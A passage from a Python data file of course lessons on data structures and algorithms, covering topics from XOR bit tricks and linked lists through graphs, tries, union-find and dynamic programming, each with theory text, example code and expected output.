            'Apply Brian Kernighan\'s algorithm (`n & (n - 1)`) to count set bits in O(number of 1s).'
        ],
        'theory_sections': [
            {
                'title': 'The Algebraic Superpower of Bitwise XOR',
                'content_markdown': 'The Exclusive-OR (**XOR**) operator $\\oplus$ has unique mathematical properties:\n\n1. **Self-Inverse:** $x \\oplus x = 0$\n2. **Identity:** $x \\oplus 0 = x$\n3. **Commutative & Associative:** $a \\oplus b \\oplus a = (a \\oplus a) \\oplus b = 0 \\oplus b = b$\n\nIf an array has every element appearing twice except one unique number, XORing all elements together eliminates all duplicate pairs to reveal the solitary element in $O(N)$ time and $O(1)$ memory without a hash map!',
                'key_takeaway': 'XOR cancels out duplicate identical values, allowing unique element isolation in O(N) time and O(1) space.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Bitwise XOR Cancellation',
            'subtitle': 'Bit-level cancellation of duplicate values to reveal solitary integers',
            'diagram_type': 'two_pointers_array',
            'parameters': {'operation': 'xor'}
        },
        'code_example': {
            'title': 'Single Number Finding & Brian Kernighan Set Bit Counting',
            'language': 'python',
            'code': 'from typing import List\n\ndef find_single_number(nums: List[int]) -> int:\n    unique = 0\n    for x in nums:\n        unique ^= x\n    return unique\n\ndef count_set_bits(n: int) -> int:\n    count = 0\n    while n > 0:\n        n &= (n - 1)  # Clears the lowest set bit\n        count += 1\n    return count\n\ndata = [4, 1, 2, 1, 2]\nprint(f"Solitary unique integer: {find_single_number(data)}")\nprint(f"Number of set bits in 29 (11101_2): {count_set_bits(29)}")',
            'explanation': 'XORing all numbers cancels identical pairs, while `n & (n - 1)` strips the least significant set bit in O(1) per bit.',
            'output_preview': 'Solitary unique integer: 4\nNumber of set bits in 29 (11101_2): 4'
        },
        'quiz_id': 'quiz-dsa-bitwise-algorithms-xor',
        'summary': 'You mastered bit manipulation tricks, Brian Kernighan set bit counting, and XOR isolation.',
        'next_lesson_slug': 'dsa-linked-list-reversal-dummy',
        'prev_lesson_slug': 'dsa-binary-search-variants'
    },

    # === DSA Course 2 Lessons ===
    {
        'slug': 'dsa-linked-list-reversal-dummy',
        'course_slug': 'dsa-linked-lists-stacks-queues',
        'module_id': 'dsa-list-mod-1',
        'title': 'Linked List Pointer Manipulation & Dummy Heads',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_lists',
        'learning_objectives': [
            'Understand dynamic memory allocation of linked list nodes with `val` and `next` pointers.',
            'Use dummy sentinel nodes to eliminate edge cases when inserting or deleting head nodes.',
            'Implement iterative in-place linked list reversal with 3 pointers in O(N) time and O(1) space.'
        ],
        'theory_sections': [
            {
                'title': 'Linked Nodes & The Dummy Sentinel Pattern',
                'content_markdown': 'Unlike contiguous arrays, a **Linked List** consists of discrete heap-allocated nodes, where each node holds data and a reference `next` pointing to the subsequent node.\n\nA **Dummy Sentinel Node** is a temporary placeholder placed before the real head (`dummy.next = head`). It prevents null reference exceptions when modifying the list head.',
                'key_takeaway': 'Dummy nodes simplify linked list mutations by guaranteeing that every real node has a preceding predecessor.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'In-Place Linked List Reversal',
            'subtitle': 'Flipping next pointers using prev, curr, and next_temp pointers',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'nodes': [1, 2, 3, 4]}
        },
        'code_example': {
            'title': 'Iterative In-Place Linked List Reversal in Python',
            'language': 'python',
            'code': 'class ListNode:\n    def __init__(self, val=0, next=None):\n        self.val = val\n        self.next = next\n\ndef reverse_list(head: ListNode) -> ListNode:\n    prev = None\n    curr = head\n    while curr:\n        next_temp = curr.next\n        curr.next = prev\n        prev = curr\n        curr = next_temp\n    return prev\n\nnode3 = ListNode(3)\nnode2 = ListNode(2, node3)\nnode1 = ListNode(1, node2)\n\nreversed_head = reverse_list(node1)\noutput = []\ncurr = reversed_head\nwhile curr:\n    output.append(str(curr.val))\n    curr = curr.next\nprint("Reversed List: " + " -> ".join(output))',
            'explanation': 'Using three pointers (prev, curr, next_temp), each node pointer is redirected backward without allocating new memory.',
            'output_preview': 'Reversed List: 3 -> 2 -> 1'
        },
        'quiz_id': 'quiz-dsa-linked-list-reversal-dummy',
        'summary': 'You mastered pointer management in singly linked lists and in-place node reversals.',
        'next_lesson_slug': 'dsa-floyd-cycle-detection',
        'prev_lesson_slug': 'dsa-bitwise-algorithms-xor'
    },
    {
        'slug': 'dsa-floyd-cycle-detection',
        'course_slug': 'dsa-linked-lists-stacks-queues',
        'module_id': 'dsa-list-mod-2',
        'title': 'Floyd Tortoise and Hare Cycle Detection',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_lists',
        'learning_objectives': [
            'Understand why hash set visited tracking costs O(N) memory and how Floyd\'s algorithm reduces space to O(1).',
            'Prove mathematically that slow (1 step) and fast (2 steps) pointers must meet inside any cycle.',
            'Locate the exact entry node of the cycle.'
        ],
        'theory_sections': [
            {
                'title': 'The Fast & Slow Pointer Principle',
                'content_markdown': 'To detect an infinite loop in a linked list without using $O(N)$ extra memory, we initialize two pointers at the head: `slow` advancing 1 step per tick, and `fast` advancing 2 steps per tick.\n\nIf the list is acyclic, `fast` will reach `None`. If a cycle exists, the relative speed between `fast` and `slow` is $2 - 1 = 1$ step per tick. The fast pointer will close the distance and inevitably collide with the slow pointer inside the cycle.',
                'key_takeaway': 'Floyd\'s algorithm detects linked list cycles in O(N) time and O(1) space by comparing pointer speeds.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Floyd Tortoise & Hare Collision',
            'subtitle': 'Fast pointer overlapping slow pointer inside circular list reference',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'cycle_length': 3}
        },
        'code_example': {
            'title': 'Detecting Cycle in a Linked List with Floyd Algorithm',
            'language': 'python',
            'code': 'class ListNode:\n    def __init__(self, val=0, next=None):\n        self.val = val\n        self.next = next\n\ndef has_cycle(head: ListNode) -> bool:\n    slow = head\n    fast = head\n    while fast and fast.next:\n        slow = slow.next\n        fast = fast.next.next\n        if slow == fast:\n            return True\n    return False\n\nn1 = ListNode(1)\nn2 = ListNode(2)\nn3 = ListNode(3)\nn1.next = n2\nn2.next = n3\nn3.next = n2\n\nprint(f"Cycle detected: {has_cycle(n1)}")',
            'explanation': 'The fast pointer traverses at double speed, guaranteeing collision if a circular pointer loop exists.',
            'output_preview': 'Cycle detected: True'
        },
        'quiz_id': 'quiz-dsa-floyd-cycle-detection',
        'summary': 'You mastered Floyd\'s cycle detection algorithm for linked data structures.',
        'next_lesson_slug': 'dsa-monotonic-stacks-queues',
        'prev_lesson_slug': 'dsa-linked-list-reversal-dummy'
    },
    {
        'slug': 'dsa-monotonic-stacks-queues',
        'course_slug': 'dsa-linked-lists-stacks-queues',
        'module_id': 'dsa-list-mod-3',
        'title': 'Monotonic Stacks & Next Greater Element',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_stacks',
        'learning_objectives': [
            'Understand monotonic decreasing and increasing stack invariants.',
            'Solve the Next Greater Element and Daily Temperatures problems in O(N) time.',
            'Identify when to push indices versus element values onto the stack.'
        ],
        'theory_sections': [
            {
                'title': 'Monotonic Stack Invariant Maintenance',
                'content_markdown': 'A **Monotonic Stack** maintains its elements in strictly sorted order (either strictly increasing or strictly decreasing).\n\nWhen processing a new element $X$, while the stack top violates the monotonic order, we pop items off the stack. For each popped item, $X$ is its **Next Greater Element**!\n\nBecause each element is pushed and popped at most once across the entire traversal, runtime is strictly **$O(N)$ Linear Time** instead of $O(N^2)$.',
                'key_takeaway': 'Monotonic stacks solve nearest greater/smaller element queries in linear time by maintaining sorted stack invariants.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Monotonic Stack Frame Evaluation',
            'subtitle': 'Popping smaller elements when encountering a larger incoming value',
            'diagram_type': 'two_pointers_array',
            'parameters': {'stack_type': 'decreasing'}
        },
        'code_example': {
            'title': 'Daily Temperatures (Next Warmer Day) in O(N) Time',
            'language': 'python',
            'code': 'from typing import List\n\ndef daily_temperatures(temperatures: List[int]) -> List[int]:\n    n = len(temperatures)\n    result = [0] * n\n    stack = []\n    \n    for i, temp in enumerate(temperatures):\n        while stack and temp > temperatures[stack[-1]]:\n            prev_idx = stack.pop()\n            result[prev_idx] = i - prev_idx\n        stack.append(i)\n        \n    return result\n\ntemps = [73, 74, 75, 71, 69, 72, 76, 73]\nprint(f"Days to wait for warmer temp: {daily_temperatures(temps)}")',
            'explanation': 'The stack stores indices of unresolved temperatures in decreasing order. When a warmer temperature is encountered, previous colder days are resolved in O(1).',
            'output_preview': 'Days to wait for warmer temp: [1, 1, 4, 2, 1, 1, 0, 0]'
        },
        'quiz_id': 'quiz-dsa-monotonic-stacks-queues',
        'summary': 'You mastered monotonic stacks for solving nearest element query challenges in linear time.',
        'next_lesson_slug': 'dsa-sliding-window-maximum-deque',
        'prev_lesson_slug': 'dsa-floyd-cycle-detection'
    },
    {
        'slug': 'dsa-sliding-window-maximum-deque',
        'course_slug': 'dsa-linked-lists-stacks-queues',
        'module_id': 'dsa-list-mod-4',
        'title': 'Monotonic Deques & Sliding Window Maximum',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_stacks',
        'learning_objectives': [
            'Understand double-ended queues (Deque) and O(1) push/pop from both ends.',
            'Maintain a monotonically decreasing deque of element indices.',
            'Solve the Sliding Window Maximum problem in O(N) linear time instead of O(N*K).'
        ],
        'theory_sections': [
            {
                'title': 'The Monotonic Deque Invariant',
                'content_markdown': 'To find the maximum element in every sliding window of size $K$ in $O(N)$ time:\n\nWe maintain a **Monotonic Decreasing Deque** storing indices:\n1. **Pop Smaller Elements from Back:** When adding `nums[i]`, remove all elements from the deque back that are smaller than `nums[i]` (they can never be the maximum).\n2. **Pop Expired Elements from Front:** Remove `deque[0]` if it falls outside the current window (`index <= i - k`).\n3. The current window maximum is always at `deque[0]` (the front)!',
                'key_takeaway': 'A monotonic deque discards suboptimal elements immediately, exposing the window maximum at the front in O(1).'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Monotonic Deque Window Tracker',
            'subtitle': 'Maintaining decreasing candidate indices for O(1) maximum access',
            'diagram_type': 'two_pointers_array',
            'parameters': {'k': 3}
        },
        'code_example': {
            'title': 'Sliding Window Maximum in O(N) Time via Deque in Python',
            'language': 'python',
            'code': 'from collections import deque\nfrom typing import List\n\ndef max_sliding_window(nums: List[int], k: int) -> List[int]:\n    d = deque()\n    result = []\n    \n    for i, n in enumerate(nums):\n        # 1. Discard smaller elements from back\n        while d and nums[d[-1]] < n:\n            d.pop()\n        d.append(i)\n        \n        # 2. Discard expired indices from front\n        if d[0] <= i - k:\n            d.popleft()\n            \n        # 3. Append window maximum once window size reaches k\n        if i >= k - 1:\n            result.append(nums[d[0]])\n            \n    return result\n\nvalues = [1, 3, -1, -3, 5, 3, 6, 7]\nprint(f"Max in each window of size 3: {max_sliding_window(values, 3)}")',
            'explanation': 'Each element is appended and popped at most once, providing a clean O(N) runtime for the entire array.',
            'output_preview': 'Max in each window of size 3: [3, 3, 5, 5, 6, 7]'
        },
        'quiz_id': 'quiz-dsa-sliding-window-maximum-deque',
        'summary': 'You mastered monotonic double-ended queues for linear-time range maximum queries.',
        'next_lesson_slug': 'dsa-lru-cache-doubly-linked-list',
        'prev_lesson_slug': 'dsa-monotonic-stacks-queues'
    },
    {
        'slug': 'dsa-lru-cache-doubly-linked-list',
        'course_slug': 'dsa-linked-lists-stacks-queues',
        'module_id': 'dsa-list-mod-4',
        'title': 'Least Recently Used (LRU) Cache Architecture',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_lists',
        'learning_objectives': [
            'Design an LRU Cache with O(1) `get(key)` and O(1) `put(key, value)` operations.',
            'Combine a Hash Map for O(1) key lookups with a Doubly Linked List for O(1) node ordering.',
            'Manage pseudo head and tail sentinel nodes to simplify node promotions and evictions.'
        ],
        'theory_sections': [
            {
                'title': 'Hash Map + Doubly Linked List Synergy',
                'content_markdown': 'Why does an LRU Cache need both data structures?\n\n* **Hash Map:** Gives $O(1)$ instant key lookup to locate a node in RAM.\n* **Doubly Linked List:** Gives $O(1)$ node removal and insertion when given a direct node reference (singly linked lists require $O(N)$ to find the predecessor).\n\nWhen a key is accessed, we remove the node from its current position and append it to the **Head (Most Recently Used)**. When capacity is exceeded, we evict the node right before the **Tail (Least Recently Used)** in $O(1)$.',
                'key_takeaway': 'Combining a hash map with a doubly linked list provides strictly O(1) key lookups, updates, and LRU evictions.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'LRU Cache Dual Structure',
            'subtitle': 'Hash map pointers targeting nodes inside a doubly linked list chain',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'capacity': 2}
        },
        'code_example': {
            'title': 'Implementing O(1) LRU Cache from Scratch in Python',
            'language': 'python',
            'code': 'class DNode:\n    def __init__(self, key=0, val=0):\n        self.key = key\n        self.val = val\n        self.prev = None\n        self.next = None\n\nclass LRUCache:\n    def __init__(self, capacity: int):\n        self.cap = capacity\n        self.cache = {}\n        self.head = DNode()\n        self.tail = DNode()\n        self.head.next = self.tail\n        self.tail.prev = self.head\n        \n    def _remove(self, node):\n        node.prev.next = node.next\n        node.next.prev = node.prev\n        \n    def _add_to_front(self, node):\n        node.next = self.head.next\n        node.prev = self.head\n        self.head.next.prev = node\n        self.head.next = node\n        \n    def get(self, key: int) -> int:\n        if key in self.cache:\n            node = self.cache[key]\n            self._remove(node)\n            self._add_to_front(node)\n            return node.val\n        return -1\n        \n    def put(self, key: int, value: int):\n        if key in self.cache:\n            self._remove(self.cache[key])\n        node = DNode(key, value)\n        self._add_to_front(node)\n        self.cache[key] = node\n        if len(self.cache) > self.cap:\n            lru = self.tail.prev\n            self._remove(lru)\n            del self.cache[lru.key]\n\nlru = LRUCache(2)\nlru.put(1, 100)\nlru.put(2, 200)\nprint(f"Get key 1: {lru.get(1)}") # promotes key 1\nlru.put(3, 300)                  # evicts key 2\nprint(f"Get evicted key 2: {lru.get(2)}")',
            'explanation': 'Every read and write completes in true O(1) constant time without scanning arrays or shifting elements.',
            'output_preview': 'Get key 1: 100\nGet evicted key 2: -1'
        },
        'quiz_id': 'quiz-dsa-lru-cache-doubly-linked-list',
        'summary': 'You mastered the architecture of O(1) Least Recently Used caching engines.',
        'next_lesson_slug': 'dsa-bst-validation-operations',
        'prev_lesson_slug': 'dsa-sliding-window-maximum-deque'
    },

    # === DSA Course 3 Lessons ===
    {
        'slug': 'dsa-bst-validation-operations',
        'course_slug': 'dsa-trees-graphs-search',
        'module_id': 'dsa-tree-mod-1',
        'title': 'Binary Search Tree (BST) Properties & Validations',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_trees',
        'learning_objectives': [
            'Master the fundamental BST invariant: `Left.val < Node.val < Right.val`.',
            'Validate a BST using recursive min-max upper and lower boundaries.',
            'Perform Inorder traversal to yield an ascending sorted list in O(N) time.'
        ],
        'theory_sections': [
            {
                'title': 'The BST Invariant & Recursive Bounds',
                'content_markdown': 'A **Binary Search Tree (BST)** is a binary tree where for every node $X$:\n\n* All keys in $X$\'s left subtree are strictly **less than** $X$.key.\n* All keys in $X$\'s right subtree are strictly **greater than** $X$.key.\n\nA common mistake is checking only immediate children (`node.left < node`). To validate the entire subtree, each node must be bounded within a global range `(min_val, max_val)`.',
                'key_takeaway': 'Validating a BST requires propagating lower and upper bounds recursively across all ancestor paths.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'BST Recursive Boundary Propagation',
            'subtitle': 'Left children bounded by upper limit, Right children bounded by lower limit',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'root': 50}
        },
        'code_example': {
            'title': 'Validating Binary Search Tree with Min-Max Ranges',
            'language': 'python',
            'code': 'class TreeNode:\n    def __init__(self, val=0, left=None, right=None):\n        self.val = val\n        self.left = left\n        self.right = right\n\ndef is_valid_bst(root: TreeNode) -> bool:\n    def validate(node, low=float("-inf"), high=float("inf")):\n        if not node:\n            return True\n        if not (low < node.val < high):\n            return False\n        return validate(node.left, low, node.val) and validate(node.right, node.val, high)\n    \n    return validate(root)\n\nvalid_root = TreeNode(2, TreeNode(1), TreeNode(3))\nprint(f"Is tree a valid BST: {is_valid_bst(valid_root)}")',
            'explanation': 'Each recursive call constrains the valid numerical range for subtrees, ensuring full tree compliance in O(N).',
            'output_preview': 'Is tree a valid BST: True'
        },
        'quiz_id': 'quiz-dsa-bst-validation-operations',
        'summary': 'You mastered Binary Search Tree invariants and range validation.',
        'next_lesson_slug': 'dsa-graph-bfs-traversals',
        'prev_lesson_slug': 'dsa-lru-cache-doubly-linked-list'
    },
    {
        'slug': 'dsa-graph-bfs-traversals',
        'course_slug': 'dsa-trees-graphs-search',
        'module_id': 'dsa-tree-mod-2',
        'title': 'Graph BFS & Unweighted Shortest Path',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_graphs',
        'learning_objectives': [
            'Represent graphs using adjacency lists and hash maps.',
            'Implement Breadth-First Search (BFS) using a FIFO queue to discover shortest paths in unweighted networks.',
            'Track visited nodes using hash sets to prevent cyclic infinite loops.'
        ],
        'theory_sections': [
            {
                'title': 'Breadth-First Search & Level-Order Expansion',
                'content_markdown': 'In an unweighted graph, **Breadth-First Search (BFS)** radiates outward like water ripples from a starting vertex. Because it visits all distance-1 neighbors before distance-2 neighbors, the first time BFS reaches a target vertex is mathematically guaranteed to be the **shortest path**.\n\nTime Complexity is **$O(V + E)$** where $V$ is number of vertices and $E$ is number of edges.',
                'key_takeaway': 'BFS uses a FIFO queue to explore nodes level-by-level, finding shortest paths in unweighted graphs.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Graph Level-Order Wavefront',
            'subtitle': 'Frontier queue expansion exploring adjacent neighbor vertices',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'start': 'A'}
        },
        'code_example': {
            'title': 'Shortest Path Discovery with Graph BFS in Python',
            'language': 'python',
            'code': 'from collections import deque\nfrom typing import Dict, List, Optional\n\ndef shortest_path_bfs(graph: Dict[str, List[str]], start: str, target: str) -> Optional[int]:\n    queue = deque([(start, 0)])\n    visited = {start}\n    \n    while queue:\n        curr, dist = queue.popleft()\n        if curr == target:\n            return dist\n        \n        for neighbor in graph.get(curr, []):\n            if neighbor not in visited:\n                visited.add(neighbor)\n                queue.append((neighbor, dist + 1))\n                \n    return None\n\nnetwork = {\n    "A": ["B", "C"],\n    "B": ["A", "D"],\n    "C": ["A", "D", "E"],\n    "D": ["B", "C", "F"],\n    "E": ["C", "F"],\n    "F": ["D", "E"]\n}\nprint(f"Shortest path from A to F: {shortest_path_bfs(network, \'A\', \'F\')} edges")',
            'explanation': 'The FIFO queue guarantees that vertices are visited in order of ascending distance from the source.',
            'output_preview': 'Shortest path from A to F: 3 edges'
        },
        'quiz_id': 'quiz-dsa-graph-bfs-traversals',
        'summary': 'You mastered Breadth-First Search for discovering shortest paths and connected components.',
        'next_lesson_slug': 'dsa-dfs-topological-sort',
        'prev_lesson_slug': 'dsa-bst-validation-operations'
    },
    {
        'slug': 'dsa-dfs-topological-sort',
        'course_slug': 'dsa-trees-graphs-search',
        'module_id': 'dsa-tree-mod-3',
        'title': 'Depth-First Search (DFS) & Topological Sorting',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_graphs',
        'learning_objectives': [
            'Master Depth-First Search (DFS) recursion and backtracking.',
            'Detect cycles in directed graphs using 3-state node coloring (Unvisited, Visiting, Visited).',
            'Compute Topological Orderings for task dependency schedules (e.g. Course Schedule, Package Builders).'
        ],
        'theory_sections': [
            {
                'title': 'Topological Sorting of Directed Acyclic Graphs (DAGs)',
                'content_markdown': 'A **Topological Sort** of a Directed Acyclic Graph (DAG) is a linear ordering of vertices such that for every directed edge $u \\to v$, vertex $u$ comes before $v$ in the ordering.\n\nThis is the core algorithm used by package managers (`npm`, `pip`, `apt`) and build systems (`webpack`, `bazel`) to compile dependencies in the correct order.',
                'key_takeaway': 'Topological sort resolves prerequisite dependencies linearly in O(V + E) using postorder DFS or Kahn\'s in-degree algorithm.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Directed Dependency Topological Order',
            'subtitle': 'Resolving prerequisite task graph chains without cyclic deadlocks',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'dag': True}
        },
        'code_example': {
            'title': 'Course Schedule Dependency Resolution via Kahn Algorithm',
            'language': 'python',
            'code': 'from collections import deque, defaultdict\nfrom typing import List\n\ndef can_finish_courses(num_courses: int, prerequisites: List[List[int]]) -> bool:\n    adj = defaultdict(list)\n    in_degree = [0] * num_courses\n    \n    for course, prereq in prerequisites:\n        adj[prereq].append(course)\n        in_degree[course] += 1\n        \n    queue = deque([i for i in range(num_courses) if in_degree[i] == 0])\n    processed = 0\n    \n    while queue:\n        curr = queue.popleft()\n        processed += 1\n        for neighbor in adj[curr]:\n            in_degree[neighbor] -= 1\n            if in_degree[neighbor] == 0:\n                queue.append(neighbor)\n                \n    return processed == num_courses\n\nprereqs = [[1, 0], [2, 1], [3, 2]]\nprint(f"Can finish all 4 courses: {can_finish_courses(4, prereqs)}")',
            'explanation': 'Kahn\'s algorithm processes vertices with 0 incoming dependencies first, removing edges and checking for cyclic dependencies in O(V + E).',
            'output_preview': 'Can finish all 4 courses: True'
        },
        'quiz_id': 'quiz-dsa-dfs-topological-sort',
        'summary': 'You mastered DFS backtracking, cycle detection, and topological sorting.',
        'next_lesson_slug': 'dsa-trie-autocomplete-prefix',
        'prev_lesson_slug': 'dsa-graph-bfs-traversals'
    },
    {
        'slug': 'dsa-trie-autocomplete-prefix',
        'course_slug': 'dsa-trees-graphs-search',
        'module_id': 'dsa-tree-mod-4',
        'title': 'Trie (Prefix Tree) for Autocomplete & Dictionaries',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_trees',
        'learning_objectives': [
            'Understand multi-way tree branching where edges represent characters in an alphabet.',
            'Implement `insert(word)`, `search(word)`, and `startsWith(prefix)` in O(L) time where L is word length.',
            'Design prefix autocomplete search engines with terminal end-of-word boolean flags.'
        ],
        'theory_sections': [
            {
                'title': 'Trie Architecture & Prefix Sharing',
                'content_markdown': 'A **Trie (Prefix Tree)** organizes strings by sharing common prefixes. For example, `"apple"`, `"app"`, and `"apply"` share the prefix `"app"` across the same first 3 nodes.\n\nSearching for any prefix of length $L$ takes strictly **$O(L)$ time**, completely independent of the total number of words $N$ stored in the dictionary!',
                'key_takeaway': 'Tries provide O(L) prefix searches by walking character branch nodes, enabling instant autocomplete engines.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Trie Character Branching Hierarchy',
            'subtitle': 'Shared prefix nodes branching into distinct word terminals',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'root': 'trie'}
        },
        'code_example': {
            'title': 'Implementing an Autocomplete Trie in Python',
            'language': 'python',
            'code': 'class TrieNode:\n    def __init__(self):\n        self.children = {}\n        self.is_end_of_word = False\n\nclass Trie:\n    def __init__(self):\n        self.root = TrieNode()\n        \n    def insert(self, word: str):\n        curr = self.root\n        for char in word:\n            if char not in curr.children:\n                curr.children[char] = TrieNode()\n            curr = curr.children[char]\n        curr.is_end_of_word = True\n        \n    def starts_with(self, prefix: str) -> bool:\n        curr = self.root\n        for char in prefix:\n            if char not in curr.children:\n                return False\n            curr = curr.children[char]\n        return True\n\ntrie = Trie()\nfor w in ["apple", "app", "application", "aptitude"]:\n    trie.insert(w)\n\nprint(f"Has words starting with \'app\': {trie.starts_with(\'app\')}")\nprint(f"Has words starting with \'ban\': {trie.starts_with(\'ban\')}")',
            'explanation': 'The trie traverses character nodes sequentially, returning boolean matches in O(L) time.',
            'output_preview': 'Has words starting with \'app\': True\nHas words starting with \'ban\': False'
        },
        'quiz_id': 'quiz-dsa-trie-autocomplete-prefix',
        'summary': 'You mastered Trie prefix trees for high-speed dictionary and autocomplete search.',
        'next_lesson_slug': 'dsa-union-find-disjoint-set',
        'prev_lesson_slug': 'dsa-dfs-topological-sort'
    },
    {
        'slug': 'dsa-union-find-disjoint-set',
        'course_slug': 'dsa-trees-graphs-search',
        'module_id': 'dsa-tree-mod-4',
        'title': 'Disjoint Set Union (Union-Find) & Path Compression',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_graphs',
        'learning_objectives': [
            'Understand disjoint set partitioning and representative leader root nodes.',
            'Implement Path Compression and Union by Rank to achieve nearly O(1) amortized inverse Ackermann α(N) runtime.',
            'Detect cycles in undirected graphs and connect components dynamically.'
        ],
        'theory_sections': [
            {
                'title': 'Path Compression & Union by Rank',
                'content_markdown': 'The **Union-Find (DSU)** data structure maintains partitioned subsets with two primary operations:\n\n1. **`find(x)`:** Locates the representative root leader of element $x$.\n   * *Path Compression:* While traversing up to the root, points every intermediate node directly to the root, flattening tree depth to 1!\n2. **`union(x, y)`:** Connects the sets containing $x$ and $y$.\n   * *Union by Rank:* Attaches the shallower tree under the deeper tree.\n\nTogether, operations run in nearly **$O(1)$ amortized time** (Inverse Ackermann function $\\alpha(N) < 5$).',
                'key_takeaway': 'Union-Find with path compression checks dynamic connectivity between N elements in near-instant O(1) amortized time.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Union-Find Path Compression Flattening',
            'subtitle': 'Re-linking deep branch nodes directly to set root leaders',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'dsu': True}
        },
        'code_example': {
            'title': 'Union-Find with Path Compression and Undirected Cycle Detection',
            'language': 'python',
            'code': 'class UnionFind:\n    def __init__(self, size: int):\n        self.parent = list(range(size))\n        self.rank = [0] * size\n        \n    def find(self, x: int) -> int:\n        if self.parent[x] != x:\n            self.parent[x] = self.find(self.parent[x])  # Path compression\n        return self.parent[x]\n        \n    def union(self, x: int, y: int) -> bool:\n        root_x = self.find(x)\n        root_y = self.find(y)\n        if root_x == root_y:\n            return False  # Cycle detected!\n        if self.rank[root_x] < self.rank[root_y]:\n            self.parent[root_x] = root_y\n        elif self.rank[root_x] > self.rank[root_y]:\n            self.parent[root_y] = root_x\n        else:\n            self.parent[root_y] = root_x\n            self.rank[root_x] += 1\n        return True\n\ndsu = UnionFind(4)\nedges = [(0, 1), (1, 2), (2, 3), (3, 0)]\nfor u, v in edges:\n    connected = dsu.union(u, v)\n    if not connected:\n        print(f"Cycle detected when adding edge ({u}, {v})!")',
            'explanation': 'Path compression and union by rank detect connected components and graph cycles in O(1) amortized time.',
            'output_preview': 'Cycle detected when adding edge (3, 0)!'
        },
        'quiz_id': 'quiz-dsa-union-find-disjoint-set',
        'summary': 'You mastered Disjoint Set Union (DSU) with path compression for near-constant time graph connectivity.',
        'next_lesson_slug': 'dsa-memoization-vs-tabulation',
        'prev_lesson_slug': 'dsa-trie-autocomplete-prefix'
    },

    # === DSA Course 4 Lessons ===
    {
        'slug': 'dsa-memoization-vs-tabulation',
        'course_slug': 'dsa-dynamic-programming-recursion',
        'module_id': 'dsa-dp-mod-1',
        'title': 'Dynamic Programming: Memoization vs Tabulation',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_dp',
        'learning_objectives': [
            'Identify overlapping subproblems and optimal substructures in recursion trees.',
            'Convert exponential O(2^N) recursive algorithms into linear O(N) top-down memoization.',
            'Implement bottom-up iterative tabulation to eliminate recursion call stack overhead.'
        ],
        'theory_sections': [
            {
                'title': 'Overlapping Subproblems & The DP Principle',
                'content_markdown': 'In standard recursion, computing `fib(5)` redundantly evaluates `fib(3)` multiple times across branches, exploding runtime to $O(2^N)$ exponential.\n\n**Dynamic Programming (DP)** solves each unique subproblem exactly once and stores the result in a lookup table:\n\n* **Top-Down (Memoization):** Standard recursive function + hash map cache.\n* **Bottom-Up (Tabulation):** Iterative array populated from base cases up to the target answer.',
                'key_takeaway': 'DP converts exponential O(2^N) recursion trees into linear O(N) by caching subproblem solutions.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Fibonacci Overlapping Subproblems Tree',
            'subtitle': 'Pruning duplicate branches through memoization caching',
            'diagram_type': 'bst_tree_traversal',
            'parameters': {'n': 5}
        },
        'code_example': {
            'title': 'Comparing Naive Recursion vs Memoization vs Tabulation',
            'language': 'python',
            'code': 'def fib_memo(n: int, memo=None) -> int:\n    if memo is None:\n        memo = {}\n    if n in memo:\n        return memo[n]\n    if n <= 1:\n        return n\n    memo[n] = fib_memo(n - 1, memo) + fib_memo(n - 2, memo)\n    return memo[n]\n\ndef fib_tabulation_space_optimized(n: int) -> int:\n    if n <= 1:\n        return n\n    prev2, prev1 = 0, 1\n    for _ in range(2, n + 1):\n        curr = prev1 + prev2\n        prev2, prev1 = prev1, curr\n    return prev1\n\nprint(f"Fib(30) via Memoization:        {fib_memo(30)}")\nprint(f"Fib(30) via O(1) Space Tabulation: {fib_tabulation_space_optimized(30)}")',
            'explanation': 'Space-optimized tabulation computes the 30th Fibonacci number in O(N) time and O(1) space without allocating recursion stack frames.',
            'output_preview': 'Fib(30) via Memoization:        832040\nFib(30) via O(1) Space Tabulation: 832040'
        },
        'quiz_id': 'quiz-dsa-memoization-vs-tabulation',
        'summary': 'You mastered top-down memoization and bottom-up tabulation DP strategies.',
        'next_lesson_slug': 'dsa-1d-dp-state-transitions',
